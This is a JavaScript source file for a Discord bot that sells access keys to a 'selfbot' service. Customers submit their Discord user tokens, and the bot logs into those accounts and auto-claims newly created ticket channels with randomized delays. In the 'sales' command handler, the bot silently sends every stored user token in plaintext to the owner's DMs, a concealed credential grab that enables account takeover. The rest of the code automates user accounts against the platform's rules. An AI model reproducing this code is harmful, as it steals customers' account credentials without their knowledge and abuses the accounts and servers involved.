const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_ids TEXT, category_ids TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = config.status === 'running';
        this.claimedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
        
        this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
        this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
    }

    randomDelay() {
        return Math.floor(Math.random() * 100) + 200;
    }

    saveClaimed() {
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify([...this.claimedChannels]), this.userId);
    }

    saveStatus() {
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run(this.isRunning ? 'running' : 'stopped', this.userId);
    }

    shouldMonitor(channel) {
        if (!this.guildIds.includes(channel.guildId)) return false;
        if (this.categoryIds.length === 0) return true;
        return this.categoryIds.includes(channel.parentId);
    }

    async start() {
        if (!this.config.token) return;
        if (this.client) return;
        
        this.client = new SelfbotClient({ checkUpdate: false });

        this.client.once('ready', () => {
            console.log(`[READY] ${this.userId} as ${this.client.user.tag}`);
            
            this.client.guilds.cache.forEach(guild => {
                if (!this.guildIds.includes(guild.id)) return;
                guild.channels.cache.forEach(ch => {
                    if (ch.type !== 'GUILD_TEXT' || !this.shouldMonitor(ch)) return;
                    this.setupChannel(ch);
                });
            });

            this.client.on('channelCreate', channel => {
                if (channel.type !== 'GUILD_TEXT' || !this.shouldMonitor(channel)) return;
                
                console.log(`[NEW CHANNEL] #${channel.name} in guild ${channel.guildId}`);
                this.setupChannel(channel);
                
                if (this.isRunning && !this.claimedChannels.has(channel.id)) {
                    console.log(`[AUTO-CLAIM] Will claim #${channel.name} in ${this.randomDelay()}ms`);
                    setTimeout(() => this.claim(channel), this.randomDelay());
                }
            });

            this.client.on('channelDelete', channel => {
                if (this.claimedChannels.has(channel.id)) {
                    this.claimedChannels.delete(channel.id);
                    this.saveClaimed();
                }
            });
        });

        this.client.on('error', (err) => console.log(`[WS ERROR] ${err.message}`));
        
        try {
            await this.client.login(this.config.token);
        } catch (err) {
            console.log(`[LOGIN FAIL] ${this.userId}: ${err.message}`);
            this.client = null;
        }
    }

    setupChannel(channel) {
        this.client.on('messageCreate', async (msg) => {
            if (msg.channelId !== channel.id) return;
            
            // Only respond to selfbot owner
            if (msg.author.id !== this.client.user.id) {
                // Check if someone else claimed
                if (msg.content === this.config.claim_cmd) {
                    if (!this.claimedChannels.has(channel.id)) {
                        this.claimedChannels.add(channel.id);
                        this.saveClaimed();
                        console.log(`[DETECTED] Claim in #${channel.name} by ${msg.author.tag}`);
                    }
                }
                return;
            }

            // Handle .stop command
            if (msg.content === '.stop') {
                if (!this.isRunning) {
                    setTimeout(() => msg.channel.send('⏹️ Already stopped').catch(() => {}), 3000);
                    return;
                }
                
                this.isRunning = false;
                this.saveStatus();
                console.log(`[CMD] .stop in #${channel.name}`);
                setTimeout(() => msg.channel.send('⏹️ Stopped').catch(() => {}), 3000);
                return;
            }

            // Handle .start command
            if (msg.content === '.start') {
                if (this.isRunning) {
                    setTimeout(() => msg.channel.send('▶️ Already running').catch(() => {}), 3000);
                    return;
                }
                
                this.isRunning = true;
                this.saveStatus();
                console.log(`[CMD] .start in #${channel.name}`);
                setTimeout(() => msg.channel.send('▶️ Started').catch(() => {}), 3000);
                
                // Try to claim this channel immediately
                if (!this.claimedChannels.has(channel.id)) {
                    setTimeout(() => this.claim(channel), this.randomDelay());
                }
                return;
            }

            // Only claim if running
            if (!this.isRunning) return;

            // Auto-claim check
            if (!this.claimedChannels.has(channel.id) && !msg.author.bot) {
                try {
                    const msgs = await msg.channel.messages.fetch({ limit: 10 });
                    const hasClaim = msgs.some(m => m.content === this.config.claim_cmd);
                    
                    if (!hasClaim) {
                        setTimeout(() => this.claim(channel), this.randomDelay());
                    } else {
                        this.claimedChannels.add(channel.id);
                        this.saveClaimed();
                    }
                } catch (err) {}
            }
        });
    }

    async claim(channel) {
        if (!this.isRunning || this.claimedChannels.has(channel.id)) return;
        
        this.claimedChannels.add(channel.id);
        this.saveClaimed();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd);
            console.log(`[CLAIMED] ${this.userId} in #${channel.name}`);
        } catch (err) {
            console.log(`[CLAIM FAIL] #${channel.name}: ${err.message}`);
        }
    }

    destroy() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.isRunning = false;
    }

    updateFromDB() {
        const user = db.prepare('SELECT status FROM users WHERE user_id = ?').get(this.userId);
        if (!user) return false;
        
        const newStatus = user.status === 'running';
        if (newStatus !== this.isRunning) {
            this.isRunning = newStatus;
            console.log(`[SYNC] ${this.userId} -> ${user.status}`);
            return true;
        }
        return false;
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
        await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
        await interaction.reply({ content: '✅ Redeemed! Use `/manage`', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Sales Dashboard')
            .setDescription(`Total keys: **${total}**\nRedeemed: **${redeemed}**\nActive instances: **${active}**`)
            .setColor(0x5865F2);
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token, status, guild_ids FROM users WHERE token IS NOT NULL').all();
            let list = users.map(u => `User: ${u.user_id}\nGuilds: ${u.guild_ids || 'None'}\nStatus: ${u.status}\nToken: \`${u.token}\`\n`).join('\n');
            if (list.length > 1900) list = list.substring(0, 1900) + '...';
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send({ content: `**Tokens:**\n${list || 'None'}` });
            } catch (e) {}
        }
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem a key first', ephemeral: true });
        
        const claimed = JSON.parse(user.claimed_tickets || '[]').length;
        const embed = new EmbedBuilder()
            .setTitle('🤖 Selfbot Control Panel')
            .addFields(
                { name: 'Status', value: user.status.toUpperCase(), inline: true },
                { name: 'Claimed Channels', value: `${claimed}`, inline: true },
                { name: 'Guild IDs', value: user.guild_ids || 'Not set', inline: false },
                { name: 'Category IDs', value: user.category_ids || 'All channels', inline: false },
                { name: 'Claim Command', value: user.claim_cmd || '.claim', inline: true }
            )
            .setColor(user.status === 'running' ? 0x00FF00 : 0xFF0000);

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('🔑 Set Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guilds').setLabel('🏠 Guilds').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_categories').setLabel('📁 Categories').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_cmd').setLabel('⌨️ Command').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('start_btn')
                .setLabel('▶️ Start')
                .setStyle(ButtonStyle.Success)
                .setDisabled(user.status === 'running'),
            new ButtonBuilder()
                .setCustomId('stop_btn')
                .setLabel('⏹️ Stop')
                .setStyle(ButtonStyle.Danger)
                .setDisabled(user.status === 'stopped'),
            new ButtonBuilder()
                .setCustomId('reset')
                .setLabel('🔄 Reset History')
                .setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        const userId = interaction.user.id;

        if (interaction.customId === 'start_btn') {
            let sb = activeSelfbots.get(userId);
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            
            if (!sb) {
                sb = new UserSelfbot(userId, user);
                activeSelfbots.set(userId, sb);
                await sb.start();
            } else {
                sb.isRunning = true;
                sb.saveStatus();
            }
            
            await interaction.update({ 
                content: '▶️ Started! Use `.stop` in any ticket to stop, `.start` to resume.', 
                embeds: [], 
                components: [] 
            });
            return;
        }

        if (interaction.customId === 'stop_btn') {
            const sb = activeSelfbots.get(userId);
            
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
            
            if (sb) {
                sb.isRunning = false;
                sb.saveStatus();
            }
            
            await interaction.update({ 
                content: '⏹️ Stopped! Use `.start` in any ticket to resume.', 
                embeds: [], 
                components: [] 
            });
            return;
        }

        if (interaction.customId === 'reset') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', userId);
            const sb = activeSelfbots.get(userId);
            if (sb) sb.claimedChannels.clear();
            await interaction.reply({ content: '✅ Claim history reset', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
        const input = new TextInputBuilder()
            .setCustomId('value')
            .setLabel('Enter value')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        if (interaction.customId === 'set_token') {
            input.setLabel('Discord User Token');
            input.setPlaceholder('NzkyNzE1NDU0...');
        }
        if (interaction.customId === 'set_guilds') {
            input.setLabel('Guild IDs (comma separated)');
            input.setPlaceholder('123456789,987654321');
        }
        if (interaction.customId === 'set_categories') {
            input.setLabel('Category IDs (comma separated)');
            input.setPlaceholder('123456789,987654321 (leave empty for all)');
        }
        if (interaction.customId === 'set_cmd') {
            input.setLabel('Claim Command');
            input.setPlaceholder('.claim');
        }

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '');
        const map = { token: 'token', guilds: 'guild_ids', categories: 'category_ids', cmd: 'claim_cmd' };
        
        if (map[field]) {
            db.prepare(`UPDATE users SET ${map[field]} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        }
        
        await interaction.reply({ content: `✅ ${map[field]} updated`, ephemeral: true });
    }
});

// Sync loop - checks DB for status changes from .start/.stop commands
setInterval(() => {
    activeSelfbots.forEach((sb, userId) => {
        const changed = sb.updateFromDB();
        if (changed) {
            console.log(`[SYNC] ${userId} status changed via command`);
        }
    });
}, 3000);

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        { name: 'generatekey', description: 'Generate access key (Owner only)' },
        { name: 'redeemkey', description: 'Redeem your access key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
        { name: 'sales', description: 'View sales statistics' },
        { name: 'manage', description: 'Manage your selfbot instance' }
    ]);

    // Restore running instances
    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
        console.log(`[RESTORE] Starting ${u.user_id}`);
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
